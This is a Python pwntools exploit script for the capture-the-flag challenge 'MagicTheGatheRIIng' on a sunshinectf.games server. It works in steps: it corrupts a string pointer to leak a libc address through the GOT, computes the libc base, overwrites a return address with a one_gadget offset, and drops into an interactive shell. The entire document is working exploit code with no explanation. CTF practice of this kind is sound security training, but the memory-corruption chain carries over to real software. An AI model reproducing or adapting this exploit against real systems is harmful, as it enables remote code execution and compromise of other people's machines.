#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("MagicTheGatheRIIng_patched")
libc = ELF("./libc.so.6")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def sla(delim,line): return p.sendlineafter(delim,line)

host, port = "sunshinectf.games", "22002"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# overwrite "Basic Land" string, with puts got address to leak libc address
sla('> ', '2')
payload = '20 m %p 0 '+str(0x405f60)+' 0\n'
sla(':\n', payload)

# get our leak
sla('> ', '4')
while(1):
  p.recvuntil('Drew ', drop=True)
  leak = p.recv(6)
  if 'Basic' not in leak:
    break
# calculate libc base
libc.address = u64(leak.ljust(8,b'\x00')) - libc.sym['puts']
logbase()
p.recvuntil('Simplified', drop=True)
onegadgets = one_gadget(libc.path, libc.address)

# overwrite return address with onegadgets
sla('> ', '2')
target = onegadgets[1]
payload = '45 m '+'\x40\x02\x03'+' 1337 '+str(target & 0xffffffff)+' '+str((target>>32) & 0xffffffff)+'\n'
sla(':\n', payload)
# return and get shell
sla('> ', '5%s')

p.interactive()

